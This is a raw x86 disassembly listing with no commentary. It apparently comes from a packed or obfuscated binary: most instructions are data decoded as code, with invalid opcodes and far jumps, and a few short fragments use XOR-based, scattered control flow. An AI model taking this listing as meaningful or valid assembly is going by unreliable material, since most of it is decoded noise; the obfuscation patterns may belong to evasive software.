  40f293:	cld    
  40f294:	or     BYTE PTR [eax-0x3e],bl
  40f297:	jno    0x40f263
  40f299:	add    BYTE PTR es:[ebp-0x25],al
  40f29d:	or     al,0x1d
  40f29f:	xchg   ebx,eax
  40f2a0:	not    BYTE PTR [eax-0x7ad4b343]
  40f2a6:	outs   dx,DWORD PTR ds:[esi]
  40f2a7:	adc    DWORD PTR [edi],0x61478ce7
  40f2ad:	sbb    esi,DWORD PTR [ebp-0x14]
  40f2b0:	dec    edx
  40f2b1:	pop    ds
  40f2b2:	imul   eax,DWORD PTR [eax+ecx*1],0x6f
  40f2b6:	fidivr WORD PTR [ebx+0x49493b49]
  40f2bc:	dec    ebp
  40f2bd:	sub    al,0xab
  40f2bf:	arpl   bx,sp
  40f2c1:	fisttp QWORD PTR [edi+0x5286ab3c]
  40f2c7:	xchg   ecx,eax
  40f2c8:	dec    ecx
  40f2c9:	adc    edx,edx
  40f2cb:	out    dx,al
  40f2cc:	cld    
  40f2cd:	pop    eax
  40f2ce:	ret    
  40f2cf:	sub    DWORD PTR [ebx-0x60661b3],ebx
  40f2d5:	call   0xd79d:0x83ec6826
  40f2dc:	icebp  
  40f2dd:	xchg   BYTE PTR [ecx+0x62127daf],dl
  40f2e3:	cmc    
  40f2e4:	(bad)  
  40f2e5:	neg    edx
  40f2e7:	gs inc edi
  40f2e9:	mov    ds,WORD PTR [edi+0x17]
  40f2ec:	retf   0x60a
  40f2ef:	dec    esp
  40f2f0:	jg     0x40f2b3
  40f2f2:	cmp    BYTE PTR [edx-0x33],dh
  40f2f5:	add    eax,0xc98504b7
  40f2fa:	jmp    0x863e:0xe97268c4
  40f301:	sbb    DWORD PTR [edi+eax*8-0x4404a574],esp
  40f308:	std    
  40f309:	ret    0xb8f2
  40f30c:	inc    BYTE PTR [edi+esi*1+0x2458016c]
  40f313:	mov    ah,0x39
  40f315:	sub    bl,BYTE PTR [edi+0x46ef63b0]
  40f31b:	cmp    al,BYTE PTR [ebp+0xdbe8dc2]
  40f321:	mov    dl,0xe5
  40f323:	lods   eax,DWORD PTR ds:[esi]
  40f324:	push   ecx
  40f325:	out    0xf9,al
  40f327:	fwait
  40f328:	jp     0x40f37c
  40f32a:	ins    BYTE PTR es:[edi],dx
  40f32b:	cmp    dh,BYTE PTR [esi+0x66]
  40f32e:	mov    eax,0x1624f995
  40f333:	jns    0x40f30d
  40f335:	push   esi
  40f336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f337:	and    dh,BYTE PTR [edi+0x7b09a982]
  40f33d:	inc    edi
  40f33e:	jp     0x40f3b7
  40f340:	dec    edx
  40f341:	push   0xfc0deea5
  40f346:	inc    edx
  40f347:	sub    DWORD PTR [ecx+ecx*1+0x935addc],esp
  40f34e:	jmp    0x6c86:0xfd991df7
  40f355:	sub    al,0xac
  40f357:	pop    edx
  40f358:	pop    edx
  40f359:	retf   0x6e23
  40f35c:	xchg   ebx,eax
  40f35d:	aaa    
  40f35e:	scas   eax,DWORD PTR es:[edi]
  40f35f:	retf   
  40f360:	lods   eax,DWORD PTR ds:[esi]
  40f361:	inc    eax
  40f362:	dec    ecx
  40f363:	pop    edx
  40f364:	ss xchg edx,eax
  40f366:	lahf   
  40f367:	add    eax,0xe4c5454
  40f36c:	sar    dh,1
  40f36e:	mov    esp,0xc8ecbb24
  40f373:	inc    ecx
  40f374:	fsubr  DWORD PTR [edi+0x2c145144]
  40f37a:	out    0xa,al
  40f37c:	pop    ecx
  40f37d:	mov    bl,0x74
  40f37f:	lods   eax,DWORD PTR ds:[esi]
  40f380:	mov    ch,0x78
  40f382:	push   ds
  40f383:	jmp    0xec4c:0x51a8ed4
  40f38a:	xchg   edx,eax
  40f38b:	pusha  
  40f38c:	jo     0x40f345
  40f38e:	jae    0x40f3cd
  40f390:	push   edi
  40f391:	pop    edx
  40f392:	fnstenv [edi-0x45]
  40f395:	cmp    ebp,DWORD PTR [edi+0xf]
  40f398:	mov    edi,0xe9f4dd6b
  40f39d:	dec    ebx
  40f39e:	sbb    eax,0x347ea741
  40f3a3:	lods   al,BYTE PTR ds:[esi]
  40f3a4:	je     0x40f351
  40f3a6:	mov    dl,BYTE PTR [edx]
  40f3a8:	data16 mov ah,0x6a
  40f3ab:	rcr    ch,cl
  40f3ad:	sub    BYTE PTR [ecx+0x2c],0x4b
  40f3b1:	xor    BYTE PTR ds:0x38206a0f,dh
  40f3b7:	push   0xfffffff2
  40f3b9:	out    dx,eax
  40f3ba:	lods   eax,DWORD PTR ds:[esi]
  40f3bb:	and    DWORD PTR [eax-0x64],ebp
  40f3be:	mov    BYTE PTR [edx-0x74],0xd0
  40f3c2:	mov    bl,0xc2
  40f3c4:	add    DWORD PTR [ecx-0x73763b3f],ebp
  40f3ca:	cmp    al,0xd
  40f3cc:	mov    al,ds:0xe67bba3e
  40f3d1:	shl    bl,cl
  40f3d3:	cwde   
  40f3d4:	mov    al,ds:0xb4e7dc50
  40f3d9:	inc    edx
  40f3da:	out    0xe7,al
  40f3dc:	std    
  40f3dd:	lea    edi,[ebp+ecx*2-0x23a729be]
  40f3e4:	pop    ss
  40f3e5:	and    eax,0x6e6c8fc3
  40f3ea:	mov    ebp,0xe5f5dcfb
  40f3ef:	stos   DWORD PTR es:[edi],eax
  40f3f0:	jle    0x40f402
  40f3f2:	lods   al,BYTE PTR ds:[esi]
  40f3f3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40f3f5:	cmp    al,0x36
  40f3f7:	sub    al,0x5e
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433827,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	mov    ch,0x3e
  40f42b:	and    DWORD PTR [ecx+0x7e7eabaf],eax
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f49d
  40f436:	xchg   esi,eax
  40f437:	scas   al,BYTE PTR es:[edi]
  40f438:	jecxz  0x40f434
  40f43a:	push   ss
  40f43b:	in     al,0x88
  40f43d:	push   edx
  40f43e:	out    0xb3,eax
  40f440:	sub    eax,0x6366d8f6
  40f445:	popf   
  40f446:	mov    WORD PTR [eax],ss
  40f448:	mov    ebx,0xdad4e86f
  40f44d:	dec    ebp
  40f44e:	sub    BYTE PTR [eax+0x39],dh
  40f451:	jl     0x40f4b6
  40f453:	cmp    BYTE PTR [esi+0x13994193],bl
  40f459:	jge    0x40f467
  40f45b:	cld    
  40f45c:	push   eax
  40f45d:	aad    0x2e
  40f45f:	rcl    DWORD PTR [eax],0xcb
  40f462:	mov    ds:0xd84f0368,al
  40f467:	and    eax,0x61299bd7
  40f46c:	mov    ds:0x6aef378e,eax
  40f471:	mov    eax,ds:0x258e1ee
  40f476:	mov    bl,0x77
  40f478:	icebp  
  40f479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f47a:	ss aas 
  40f47c:	push   edi
  40f47d:	mov    edi,DWORD PTR [edx+esi*2+0x1186dac8]
  40f484:	and    eax,DWORD PTR [ebp+0x61ba88db]
  40f48a:	lea    ecx,[ecx]
  40f48c:	data16 jne 0x40f4fe
  40f48f:	xor    BYTE PTR [ebx+0xc],dl
  40f492:	xchg   edx,eax
  40f493:	cmp    BYTE PTR [esi+esi*4-0xe695d57],ch
  40f49a:	into   
  40f49b:	mov    DWORD PTR [edi+0xc05802a],esp
  40f4a1:	push   ss
  40f4a2:	dec    esi
  40f4a3:	jle    0x40f464
  40f4a5:	pop    ebx
  40f4a6:	fistp  WORD PTR [ecx]
  40f4a8:	sub    ch,cl
  40f4aa:	xchg   edi,edx
  40f4ac:	sar    BYTE PTR [edx+ecx*1-0x5b59a254],cl
  40f4b3:	imul   ebx,DWORD PTR [edx],0x38
  40f4b6:	mov    edi,0x6d9688cc
  40f4bb:	inc    eax
  40f4bc:	sbb    al,0x88
  40f4be:	out    dx,al
  40f4bf:	mov    ah,0x1a
  40f4c1:	(bad)  
  40f4c2:	repz fdiv QWORD PTR [ebx-0x4ab802b2]
  40f4c9:	in     al,dx
  40f4ca:	inc    esp
  40f4cb:	call   0xcd09:0x378455e8
  40f4d2:	pop    ebx
  40f4d3:	jecxz  0x40f45f
  40f4d5:	dec    esi
  40f4d6:	das    
  40f4d7:	cdq    
  40f4d8:	cmovs  ebx,DWORD PTR [eax+ebx*8]
  40f4dc:	fwait
  40f4dd:	push   edi
  40f4de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4df:	add    eax,0x25bb2e33
  40f4e4:	aaa    
  40f4e5:	xor    eax,0x64c2f3d3
  40f4ea:	adc    eax,0x9542fef2
  40f4ef:	loope  0x40f538
  40f4f1:	sbb    ecx,eax
  40f4f3:	jg     0x40f4d7
  40f4f5:	sub    eax,DWORD PTR [eax+0x203b8781]
  40f4fb:	dec    ecx
  40f4fc:	or     eax,0x777aa23c
  40f501:	mov    gs,WORD PTR [ebx+0x712602e9]
  40f507:	mov    al,ds:0xd0b24d1a
  40f50c:	or     eax,DWORD PTR [ebp-0x20]
  40f50f:	in     al,dx
  40f510:	add    ebp,DWORD PTR [eax+0x27]
  40f513:	inc    edx
  40f514:	(bad)  
  40f515:	ror    BYTE PTR [edi],cl
  40f517:	stc    
  40f518:	adc    cl,dl
  40f51a:	fucom  st(7)
  40f51c:	rcl    DWORD PTR [ebp-0x11b7a1a5],0xbc
  40f523:	add    DWORD PTR [eax],ebp
  40f525:	cmp    DWORD PTR [ebx],ecx
  40f527:	cmp    bl,BYTE PTR [edi+0x8aad5d7]
  40f52d:	inc    edi
  40f52e:	fsub   DWORD PTR [esi]
  40f530:	mov    al,ss:0x2b6c4d84
  40f536:	(bad)  [esi+0x62]
  40f539:	cmc    
  40f53a:	in     al,dx
  40f53b:	daa    
  40f53c:	rol    BYTE PTR [di-0x3288],cl
  40f541:	(bad)  
  40f542:	and    BYTE PTR [edi],0x61
  40f545:	cmp    DWORD PTR gs:[ecx],esi
  40f548:	icebp  
  40f549:	call   0xb14f:0x6cf59972
  40f550:	retf   0x26d7
  40f553:	mov    bh,0x6b
  40f555:	sub    al,0x6f
  40f557:	adc    ah,0x65
  40f55a:	std    
  40f55b:	mov    ah,0x65
  40f55d:	push   es
  40f55e:	adc    BYTE PTR [eax+edx*1-0x6cf39554],ch
  40f565:	cmp    eax,0x14a9f01f
  40f56a:	and    al,0x1b
  40f56c:	mov    ds:0x92199f04,eax
  40f571:	leave  
  40f572:	lea    edi,[ebx+0x4df9c79c]
  40f578:	(bad)  [ebp+0x72]
  40f57b:	rdtsc  
  40f57d:	jnp    0x40f59f
  40f57f:	or     ebp,esi
  40f581:	push   ebx
  40f582:	aaa    
  40f583:	daa    
  40f584:	sub    BYTE PTR [edi-0xa],cl
  40f587:	ins    DWORD PTR es:[edi],dx
  40f588:	imul   ecx,DWORD PTR [ecx+0x40],0x62
  40f58c:	mov    al,ds:0x11c75d1a
  40f591:	push   sp
  40f593:	adc    edi,DWORD PTR [ebp+0x30]
  40f596:	leave  
  40f597:	xor    esp,DWORD PTR gs:[ecx-0x235e62c5]
  40f59e:	je     0x40f612
  40f5a0:	sbb    al,0x2f
  40f5a2:	pop    edx
  40f5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5a5:	retf   
  40f5a6:	mov    dl,0x41
  40f5a8:	mov    bh,0x11
  40f5aa:	imul   ebp,DWORD PTR gs:[esi],0xffffffa1
  40f5ae:	sbb    BYTE PTR [esi+0x3a],dh
  40f5b1:	sar    BYTE PTR [ebx+0x2c4cdf98],cl
  40f5b7:	sbb    eax,0x1f72e246
  40f5bc:	stc    
  40f5bd:	test   DWORD PTR [edx+ecx*8+0x5aeefaaa],0xcfc5d23
  40f5c8:	ret    0x5a11
  40f5cb:	inc    esp
  40f5cc:	cmp    al,0x54
  40f5ce:	ss push esp
  40f5d0:	jno    0x40f5a7
  40f5d2:	jbe    0x40f579
  40f5d4:	jae    0x40f5eb
  40f5d6:	cmp    ebp,ebx
  40f5d8:	jb     0x40f5ea
  40f5da:	ss push ebx
  40f5dc:	imul   ecx,DWORD PTR [esi],0xfffffff4
  40f5df:	ret    0x3800
  40f5e2:	out    0x15,al
  40f5e4:	and    BYTE PTR [ebx-0x2c6daeed],dl
  40f5ea:	cs cmc 
  40f5ec:	push   es
  40f5ed:	cmp    bh,dl
  40f5ef:	lods   al,BYTE PTR ds:[esi]
  40f5f0:	mov    ebx,0x1601e074
  40f5f5:	daa    
  40f5f6:	(bad)  
  40f5f7:	popf   
  40f5f8:	cli    
  40f5f9:	sub    dh,BYTE PTR [edx-0x7930b52d]
  40f5ff:	xchg   ebx,eax
  40f600:	pop    ecx
  40f601:	mov    bh,0x73
  40f603:	xor    DWORD PTR [ebp-0xa],edx
  40f606:	cld    
  40f607:	icebp  
  40f608:	fsubr  QWORD PTR [eax]
  40f60a:	js     0x40f5b2
  40f60c:	and    BYTE PTR [esi-0x5e83d11c],al
  40f612:	je     0x40f68e
  40f614:	xchg   BYTE PTR [eax-0x79],ch
  40f617:	retf   0x9189
  40f61a:	popf   
  40f61b:	and    DWORD PTR [ebx],edi
  40f61d:	arpl   WORD PTR [ebp-0x655ef5c3],bp
  40f623:	and    BYTE PTR [eax-0x15],ch
  40f626:	rcl    DWORD PTR [edi],1
  40f628:	cmp    dh,bh
  40f62a:	dec    ecx
  40f62b:	in     eax,0x27
  40f62d:	adc    BYTE PTR [ebx+0x7],0xad
  40f631:	das    
  40f632:	aad    0xd9
  40f634:	out    dx,al
  40f635:	mov    esi,DWORD PTR [ecx+edx*8+0x7a]
  40f639:	inc    ebp
  40f63a:	ja     0x40f69b
  40f63c:	add    eax,0xce2aa60c
  40f641:	jo     0x40f5f6
  40f643:	mov    cl,0xe9
  40f645:	repz xchg ecx,eax
  40f647:	xchg   esi,eax
  40f648:	dec    edi
  40f649:	fnsave [ebx+0x37]
  40f64c:	mov    ah,0xcd
  40f64e:	pop    edi
  40f64f:	lock leave 
  40f651:	ins    DWORD PTR es:[edi],dx
  40f652:	sub    DWORD PTR [edi-0x17],esi
  40f655:	popa   
  40f656:	fld    QWORD PTR [edx+0x7fb79255]
  40f65c:	mov    al,0x42
  40f65e:	add    ah,0x2e
  40f661:	push   ds
  40f662:	and    edx,DWORD PTR [ebp+0x5760255f]
  40f668:	jae    0x40f64f
  40f66a:	xlat   BYTE PTR ds:[ebx]
  40f66b:	inc    edi
  40f66c:	jg     0x40f6e8
  40f66e:	je     0x40f6ec
  40f670:	push   ss
  40f671:	mov    esi,0x41515431
  40f676:	outs   dx,BYTE PTR ds:[esi]
  40f677:	aaa    
  40f678:	stos   DWORD PTR es:[edi],eax
  40f679:	ret    0x3560
  40f67c:	or     al,0xd1
  40f67e:	xchg   edx,eax
  40f67f:	push   es
  40f680:	inc    esp
  40f681:	mov    esp,0x482e6877
  40f686:	or     eax,0xd9bde351
  40f68b:	mov    ds,eax
  40f68d:	ret    0xe824
  40f690:	dec    ebx
  40f691:	pop    ecx
  40f692:	test   edi,ebx
  40f694:	lods   al,BYTE PTR ds:[esi]
  40f695:	imul   edi,DWORD PTR [eax+0x25d762b3],0xffffffd4
  40f69c:	loope  0x40f6f5
  40f69e:	cli    
  40f69f:	out    0x2a,al
  40f6a1:	push   edx
  40f6a2:	push   0xb3115c20
  40f6a7:	ds (bad) 
  40f6a9:	xlat   BYTE PTR ds:[ebx]
  40f6aa:	cmp    ebp,edi
  40f6ac:	int    0x27
  40f6ae:	fcomp  st(0)
  40f6b0:	add    BYTE PTR [ebp+0x4b044381],ah
  40f6b6:	cs dec ecx
  40f6b8:	ret    
  40f6b9:	cli    
  40f6ba:	or     DWORD PTR [esi+0x9],ecx
  40f6bd:	push   ebx
  40f6be:	pushf  
  40f6bf:	stos   DWORD PTR es:[edi],eax
  40f6c0:	xchg   ebp,eax
  40f6c1:	ja     0x40f722
  40f6c3:	or     DWORD PTR [eax+0x14f2c393],esi
  40f6c9:	cmp    al,0x40
  40f6cb:	popa   
  40f6cc:	cmp    BYTE PTR [edx-0x76],ch
  40f6cf:	jp     0x40f725
  40f6d1:	je     0x40f6db
  40f6d3:	mov    dl,0xfd
  40f6d5:	jbe    0x40f747
  40f6d7:	fdivrp st(4),st
  40f6d9:	stc    
  40f6da:	repnz dec edx
  40f6dc:	push   ebp
  40f6dd:	adc    al,0xcc
  40f6df:	call   0xcda4:0x1103cec2
  40f6e6:	adc    eax,edi
  40f6e8:	inc    ebp
  40f6e9:	cld    
  40f6ea:	xor    al,BYTE PTR [ebp+0x2d81f89c]
  40f6f0:	daa    
  40f6f1:	cmp    BYTE PTR [ebx+0x0],al
  40f6f4:	jb     0x40f752
  40f6f6:	add    BYTE PTR [eax],al
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4337e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	mov    ebp,0xddeae46d
  40f71b:	mov    dh,0x7e
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f6ff
  40f723:	inc    esi
  40f724:	mov    ecx,0xe21aa16c
  40f729:	dec    edx
  40f72a:	out    0xc3,al
  40f72c:	mov    ds:0x2f9916b6,al
  40f731:	aam    0x7d
  40f733:	mov    ah,0x58
  40f735:	std    
  40f736:	out    dx,al
  40f737:	sub    BYTE PTR [eax],dl
  40f739:	(bad)  
  40f73a:	outs   dx,BYTE PTR ds:[esi]
  40f73b:	clc    
  40f73c:	lahf   
  40f73d:	mov    dh,0x19
  40f73f:	shl    BYTE PTR [eax+0x1803726c],1
  40f745:	das    
  40f746:	xor    al,0x4f
  40f748:	out    dx,eax
  40f749:	(bad)  
  40f74a:	call   DWORD PTR [esi-0x7f]
  40f74d:	sahf   
  40f74e:	xchg   edx,eax
  40f74f:	jo     0x40f6de
  40f751:	jo     0x40f7b9
  40f753:	dec    edx
  40f754:	adc    eax,0x8a762bfd
  40f759:	mov    BYTE PTR [edi+0x7f2360b],ch
  40f75f:	mov    al,0xe7
  40f761:	sub    esp,eax
  40f763:	add    DWORD PTR [ebp+edi*4-0x47d84c7c],edi
  40f76a:	sbb    edi,DWORD PTR [ecx+ecx*1+0x1f7f34af]
  40f771:	test   BYTE PTR [ebx-0x33],0xf1
  40f775:	sbb    al,0x93
  40f777:	inc    ebp
  40f778:	jge    0x40f7cc
  40f77a:	popa   
  40f77b:	inc    esi
  40f77c:	mov    dh,0xd0
  40f77e:	rcr    BYTE PTR [ebp+0x3f],0x4c
  40f782:	add    DWORD PTR [ebp-0x33],0x785375c0
  40f789:	fstp   DWORD PTR [esi+0x50]
  40f78c:	in     al,dx
  40f78d:	mov    edi,0xffe1fb65
  40f792:	xchg   ecx,eax
  40f793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f794:	push   ebx
  40f795:	cwde   
  40f796:	ficom  WORD PTR [edi+0x70]
  40f799:	push   ebx
  40f79a:	fldcw  WORD PTR [ecx]
  40f79c:	adc    al,BYTE PTR [ebp-0x50]
  40f79f:	pop    eax
  40f7a0:	fimul  WORD PTR [ebx-0x5f]
  40f7a3:	ins    BYTE PTR es:[edi],dx
  40f7a4:	add    DWORD PTR [eax-0x46187745],0x57a232ba
  40f7ae:	pop    ecx
  40f7af:	nop
  40f7b0:	xchg   esi,eax
  40f7b1:	stos   BYTE PTR es:[edi],al
  40f7b2:	fwait
  40f7b3:	or     DWORD PTR ds:0x7356cb3f,ecx
  40f7b9:	enter  0x97bf,0xfb
  40f7bd:	pop    ds
  40f7be:	inc    ecx
  40f7bf:	ret    0x81d5
  40f7c2:	adc    eax,0x638156d9
  40f7c7:	call   FWORD PTR [ebx]
  40f7c9:	pop    edi
  40f7ca:	dec    esi
  40f7cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7cc:	ss retf 0xdd0c
  40f7d0:	scas   al,BYTE PTR es:[edi]
  40f7d1:	mov    edx,0xe6757c84
  40f7d6:	cmc    
  40f7d7:	jbe    0x40f7dc
  40f7d9:	out    0xd1,eax
  40f7db:	jecxz  0x40f78c
  40f7dd:	add    ch,ch
  40f7df:	lods   eax,DWORD PTR ds:[esi]
  40f7e0:	shr    ebx,0x54
  40f7e3:	shl    BYTE PTR [esi+0x26b5906a],1
  40f7e9:	mov    BYTE PTR [ebp+0x7],dh
  40f7ec:	enter  0x47f,0xd9
  40f7f0:	ins    DWORD PTR es:[edi],dx
  40f7f1:	jecxz  0x40f792
  40f7f3:	fimul  DWORD PTR [ebx-0x4a]
  40f7f6:	out    dx,al
  40f7f7:	sbb    bl,BYTE PTR [ebp+0x20]
  40f7fa:	add    BYTE PTR [ecx+ebx*4],dh
  40f7fd:	les    ecx,FWORD PTR [ebx]
  40f7ff:	je     0x40f816
  40f801:	jbe    0x40f7ac
  40f803:	adc    bh,ah
  40f805:	jns    0x40f835
  40f807:	lahf   
  40f808:	ret    
  40f809:	std    
  40f80a:	sbb    al,0xb4
  40f80c:	ret    0xb6d1
  40f80f:	push   ebx
  40f810:	stos   BYTE PTR es:[edi],al
  40f811:	shr    DWORD PTR [ebp-0x3f53fa0f],0x46
  40f818:	nop
  40f819:	jl     0x40f855
  40f81b:	addr16 nop
  40f81d:	sbb    eax,0xb2d81bf
  40f822:	jns    0x40f87c
  40f824:	or     esi,DWORD PTR ds:0x88fc0dd8
  40f82a:	lea    ecx,[esi-0x28a65643]
  40f830:	pop    eax
  40f831:	(bad)  
  40f832:	dec    edi
  40f833:	mov    ecx,0x6f563214
  40f838:	sub    BYTE PTR [eax],bh
  40f83a:	ss in  al,dx
  40f83c:	adc    eax,0xe0f38b43
  40f841:	es jo  0x40f7d9
  40f844:	xor    BYTE PTR [ecx+0x26],bl
  40f847:	or     BYTE PTR [esi+0x6bb49a94],bh
  40f84d:	ret    
  40f84e:	mov    ah,0xd5
  40f850:	dec    eax
  40f851:	das    
  40f852:	jle    0x40f8a9
  40f854:	std    
  40f855:	loopne 0x40f83b
  40f857:	jge    0x40f7f9
  40f859:	push   esi
  40f85a:	or     ecx,DWORD PTR [edi+0x16]
  40f85d:	mov    es,WORD PTR [ebx+0x4c]
  40f860:	int3   
  40f861:	jbe    0x40f863
  40f863:	sub    BYTE PTR [edx+0x76],bl
  40f866:	or     DWORD PTR [ecx],ecx
  40f868:	fisubr DWORD PTR [ecx+0x3bf383a0]
  40f86e:	push   ebp
  40f86f:	shl    ebx,1
  40f871:	(bad)  
  40f872:	jmp    0x3198c83b
  40f877:	enter  0xbf1a,0x58
  40f87b:	test   al,0x16
  40f87d:	lahf   
  40f87e:	into   
  40f87f:	neg    DWORD PTR [edi-0x4a162641]
  40f885:	sbb    ah,BYTE PTR ds:0xf2130260
  40f88b:	pop    eax
  40f88c:	xor    DWORD PTR [eax],0x2a
  40f88f:	daa    
  40f890:	dec    eax
  40f891:	push   ebx
  40f892:	mov    bl,0xae
  40f894:	ret    
  40f895:	mov    edi,0x28841b74
  40f89a:	gs sbb eax,0x871bcf32
  40f8a0:	das    
  40f8a1:	ret    
  40f8a2:	mov    ds:0xe35718bf,al
  40f8a7:	cmp    eax,0xa31b21b2
  40f8ac:	cmp    al,0xe5
  40f8ae:	and    eax,DWORD PTR [ecx+0x10]
  40f8b1:	add    BYTE PTR [ebx+eax*8],dh
  40f8b4:	mov    WORD PTR [ebx],fs
  40f8b6:	pop    ecx
  40f8b7:	icebp  
  40f8b8:	mov    dh,0x18
  40f8ba:	popf   
  40f8bb:	mov    edx,0xf1d18f25
  40f8c0:	jae    0x40f8d1
  40f8c2:	retf   
  40f8c3:	sbb    eax,0x14de32b5
  40f8c8:	out    dx,eax
  40f8c9:	add    eax,DWORD PTR [ebx-0x433003d5]
  40f8cf:	push   ss
  40f8d0:	sbb    BYTE PTR [edi+ebx*4+0x44],ah
  40f8d4:	cwde   
  40f8d5:	mov    cl,0x58
  40f8d7:	or     al,0x50
  40f8d9:	mov    esp,0xb55c32a5
  40f8de:	add    BYTE PTR [edx],al
  40f8e0:	bswap  edx
  40f8e2:	clc    
  40f8e3:	or     BYTE PTR [esi-0x64],dl
  40f8e6:	pop    ss
  40f8e7:	jl     0x40f965
  40f8e9:	push   eax
  40f8ea:	inc    eax
  40f8eb:	mov    ebp,0x9c8645d5
  40f8f0:	mov    ch,0xee
  40f8f2:	fsubr  QWORD PTR [eax+0x7562e213]
  40f8f8:	out    0xf7,eax
  40f8fa:	pop    ebx
  40f8fb:	(bad)  
  40f8fc:	call   DWORD PTR [ebp+0x1ceffc92]
  40f902:	sub    eax,0x751ae9cd
  40f907:	rcl    BYTE PTR [ebp+0x23bab1b4],0x9b
  40f90e:	jmp    0x1868c12a
  40f913:	jns    0x40f975
  40f915:	dec    eax
  40f916:	jae    0x40f97c
  40f918:	cmp    edi,DWORD PTR es:[esi-0x7a6512a5]
  40f91f:	sbb    DWORD PTR [eax+ecx*8-0x4f],esp
  40f923:	ror    BYTE PTR [esi+edi*2+0x5a],1
  40f927:	push   cs
  40f928:	out    0xe7,al
  40f92a:	xchg   esi,eax
  40f92b:	mov    bl,0x58
  40f92d:	out    dx,al
  40f92e:	or     dh,BYTE PTR [edi-0x54307e87]
  40f934:	test   al,0x4e
  40f936:	es sbb al,0x3c
  40f939:	fadd   DWORD PTR [eax-0x73b23cd6]
  40f93f:	dec    ecx
  40f940:	push   edx
  40f941:	ins    BYTE PTR es:[edi],dx
  40f942:	mov    ah,0x15
  40f944:	ja     0x40f8ce
  40f946:	arpl   sp,dx
  40f948:	mov    ebx,0x896f7428
  40f94d:	sub    DWORD PTR [ecx-0x45],eax
  40f950:	retf   0x8f1a
  40f953:	xor    BYTE PTR ds:0x69f4917d,dh
  40f959:	xchg   edx,eax
  40f95a:	mov    esi,0x8a6c7ef3
  40f95f:	std    
  40f960:	cmp    al,0xb6
  40f962:	jge    0x40f953
  40f964:	jno    0x40f98f
  40f966:	pop    ecx
  40f967:	mov    ds:0x20072071,eax
  40f96c:	jbe    0x40f9ec
  40f96e:	xor    al,0xac
  40f970:	into   
  40f971:	sbb    BYTE PTR [edx-0x7f18944d],bl
  40f977:	in     eax,dx
  40f978:	and    al,0x4a
  40f97a:	push   ds
  40f97b:	jge    0x40f9af
  40f97d:	inc    ebx
  40f97e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f97f:	xchg   ebx,eax
  40f980:	js     0x40f95d
  40f982:	pop    esp
  40f983:	cmp    al,0x53
  40f985:	xchg   edi,eax
  40f986:	mov    ah,0x2d
  40f988:	pop    ecx
  40f989:	idiv   eax
  40f98b:	and    al,BYTE PTR [esi-0x4]
  40f98e:	mov    al,cl
  40f990:	jbe    0x40f951
  40f992:	mov    ebx,0xc1145c5e
  40f997:	push   edx
  40f998:	pop    esp
  40f999:	jno    0x40f994
  40f99b:	cld    
  40f99c:	aad    0x1c
  40f99e:	or     dh,BYTE PTR [edi+0x4a5f4927]
  40f9a4:	gs in  eax,dx
  40f9a6:	fstp   TBYTE PTR [edx]
  40f9a8:	jb     0x40fa26
  40f9aa:	pop    esp
  40f9ab:	sbb    eax,0x6d8b0d3f
  40f9b0:	cwde   
  40f9b1:	shl    edx,1
  40f9b3:	or     DWORD PTR [edi-0x7c034397],ebp
  40f9b9:	jmp    0x40f96b
  40f9bb:	lock loope 0x40f94c
  40f9be:	sub    al,0x93
  40f9c0:	rcr    DWORD PTR [edi],0x92
  40f9c3:	pop    eax
  40f9c4:	push   ecx
  40f9c5:	nop
  40f9c6:	retf   0x5a5f
  40f9c9:	lods   eax,DWORD PTR ds:[esi]
  40f9ca:	aaa    
  40f9cb:	dec    esp
  40f9cc:	or     cl,BYTE PTR [esi-0x379bbf44]
  40f9d2:	pushf  
  40f9d3:	pop    edx
  40f9d4:	push   esi
  40f9d5:	adc    esi,DWORD PTR ds:0x433777
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43377b
  40f9e5:	adc    DWORD PTR ds:0x433833,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	fsub   DWORD PTR [edi+0x2c]
  40fa13:	(bad)  
  40fa14:	or     esi,DWORD PTR [ebp+0x7cac7e7e]
  40fa1a:	jle    0x40fa9a
  40fa1c:	inc    esp
  40fa1d:	lods   al,BYTE PTR ds:[esi]
  40fa1e:	mov    cl,0x8e
  40fa20:	adc    DWORD PTR [edi+edx*1+0x37],ecx
  40fa24:	push   cs
  40fa25:	mov    ah,dh
  40fa27:	or     dh,BYTE PTR [ebx-0x9336216]
